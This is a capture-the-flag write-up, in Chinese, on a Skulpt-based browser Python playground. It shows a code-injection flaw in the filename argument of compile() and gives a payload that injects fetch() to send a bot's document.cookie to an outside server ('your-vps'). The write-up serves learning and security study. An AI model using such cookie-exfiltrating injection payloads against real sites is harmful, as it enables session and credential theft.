# Playground

## 题目简述

题目是一个 Python Playground，用户提交 Python 代码，浏览器端用 Skulpt 编译并执行；“share with bot” 会让 bot 带着 `flag` cookie 访问包含代码参数的页面并点击运行按钮。

bot 逻辑中可以看到 flag 被设置为 `http://127.0.0.1/` 下的 cookie：

```ts
await page.setCookie({
  name: "flag",
  value: flag,
  url: "http://127.0.0.1/",
});
```

目标是在 bot 浏览器中形成 XSS，读取 cookie 并外带。

## 解题过程

### 关键观察

前端使用 Skulpt 执行 Python。常见的 JavaScript 执行入口有两个：

1. Skulpt 内置 `jseval`，但题目禁用了它。
2. `import xxx` 时 Skulpt 会寻找 `xxx.js` 或 `xxx.py`，但题目环境限制了可加载文件，不能直接写入并导入任意 JS。

预期漏洞在 Python 内置 `compile` 的第二个参数 `filename`。Skulpt 把 Python 编译成 JavaScript 时，普通字符串字面量会被包装为内部对象；但 `compile(source, filename, mode)` 的 `filename` 参数没有经过同样处理，而是拼接进生成代码中，形成代码注入。

### payload

构造恶意 `filename`，让编译后的 JavaScript 中拼入 `fetch`：

```python
filename = "' + fetch(`http://your-vps/?${btoa(document.cookie) || 'none'}`) + '"
code = compile("raise Exception('trigger')", filename, "exec")
exec(code)
```

`raise Exception` 用来触发异常路径，使 Skulpt 输出异常信息时执行注入的代码。bot 点击运行按钮后，payload 在 `127.0.0.1` 页面上下文执行，可以读取 `document.cookie` 并发送到外部服务器。

### 验证

将上述代码通过分享接口交给 bot 后，外部服务器收到包含 `flag` cookie 的请求，即可得到 flag。

## 方法总结

- 核心技巧：审计 Skulpt 编译链，利用 `compile` 的 `filename` 参数注入生成的 JavaScript。
- 识别信号：浏览器端 Python 解释器、bot 携带 cookie、禁用显式 JS bridge，但仍暴露编译/异常路径。
- 复用要点：前端解释器类题目不要只看语言层沙箱，还要看“源语言 -> JavaScript”的生成代码过程，文件名、异常信息、模块加载路径都可能进入 JS 源码。
